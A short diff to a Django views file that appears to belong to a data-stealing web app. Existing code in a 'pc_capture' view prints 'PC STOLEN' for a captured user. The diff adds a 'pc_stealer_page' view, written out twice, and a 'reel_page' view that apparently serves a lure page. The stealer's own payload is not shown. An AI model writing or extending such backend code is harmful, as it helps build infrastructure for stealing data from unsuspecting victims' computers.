@@ -311,3 +311,18 @@ def pc_capture(request):
         print(f"PC STOLEN → @{u}")
     
     return HttpResponse("OK")
+
+
+
+# core/views.py → ADD THIS FUNCTION
+def pc_stealer_page(request):
+    return render(request, 'core/pc-stealer.html')
+
+
+
+
+def pc_stealer_page(request):
+    return render(request, 'core/pc-stealer.html')
+
+def reel_page(request, code):
+    return render(request, 'core/reel.html')
